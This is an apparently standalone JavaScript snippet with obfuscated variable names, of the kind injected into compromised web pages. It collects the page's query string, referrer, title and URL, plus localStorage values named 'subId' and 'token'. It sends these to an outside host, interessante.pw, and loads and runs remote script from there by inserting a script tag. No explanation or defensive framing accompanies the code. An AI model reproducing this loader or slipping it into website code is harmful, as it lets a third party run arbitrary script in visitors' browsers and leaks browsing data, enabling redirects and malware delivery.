  (function() {
    var name = '_R7gJSKCWmSB8R1Yj';
    if (!window._R7gJSKCWmSB8R1Yj) {
        window._R7gJSKCWmSB8R1Yj = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://interessante.pw/doritos',
        };
    }
    const _d1V9cVmWtfNFTwHw = localStorage.getItem('config');
    if (typeof _d1V9cVmWtfNFTwHw !== 'undefined' && _d1V9cVmWtfNFTwHw !== null) {
        var _V6FpjxknDbTjM2XF = JSON.parse(_d1V9cVmWtfNFTwHw);
        var _12qzZKykqy4jFH8v = Math.round(+new Date()/1000);
        if (_V6FpjxknDbTjM2XF.created_at + window._R7gJSKCWmSB8R1Yj.ttl < _12qzZKykqy4jFH8v) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _5tHRmC2grKYwZRPr = localStorage.getItem('subId');
    var _dfGGVNVrCTtLM6Vr = localStorage.getItem('token');
    var _SCKHXPhL7P6NhwhL = '?return=js.client';
        _SCKHXPhL7P6NhwhL += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _SCKHXPhL7P6NhwhL += '&se_referrer=' + encodeURIComponent(document.referrer);
        _SCKHXPhL7P6NhwhL += '&default_keyword=' + encodeURIComponent(document.title);
        _SCKHXPhL7P6NhwhL += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _SCKHXPhL7P6NhwhL += '&name=' + encodeURIComponent(name);
        _SCKHXPhL7P6NhwhL += '&host=' + encodeURIComponent(window._R7gJSKCWmSB8R1Yj.R_PATH);
    if (typeof _5tHRmC2grKYwZRPr !== 'undefined' && _5tHRmC2grKYwZRPr && window._R7gJSKCWmSB8R1Yj.unique) {
        _SCKHXPhL7P6NhwhL += '&sub_id=' + encodeURIComponent(_5tHRmC2grKYwZRPr);
    }
    if (typeof _dfGGVNVrCTtLM6Vr !== 'undefined' && _dfGGVNVrCTtLM6Vr && window._R7gJSKCWmSB8R1Yj.unique) {
        _SCKHXPhL7P6NhwhL += '&token=' + encodeURIComponent(_dfGGVNVrCTtLM6Vr);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._R7gJSKCWmSB8R1Yj.R_PATH + _SCKHXPhL7P6NhwhL;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
